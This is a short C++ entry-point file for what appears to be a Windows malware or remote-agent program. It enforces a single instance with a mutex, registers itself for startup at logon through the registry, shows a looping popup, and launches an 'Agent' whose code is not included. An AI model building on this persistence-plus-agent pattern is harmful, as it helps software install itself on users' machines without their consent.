#include "SocketGuard.h"
#include "Agent.h"
#include "PopUp.h"
#include "Presistence.h"
#include "Mutex.h"

#include <iostream>



int main(int argc, char* argv[]) {
    SocketGuard socketGuard;

    Mutex mutex(NULL, MUTEX_NAME, NULL, MUTEX_ALL_ACCESS);
    DWORD wait = mutex.waitForSingleObject(0);

    if (wait != 0) {
        std::cout << "Process allready running\n";
        exit(1);
    }
    
    std::string path = getProcessExe();

    RegistryLogon(path);

    PopUp("Yo yo", POPUP_LOOP_CAPTION);

    Agent agent;
    agent.start();

    return 0;
}
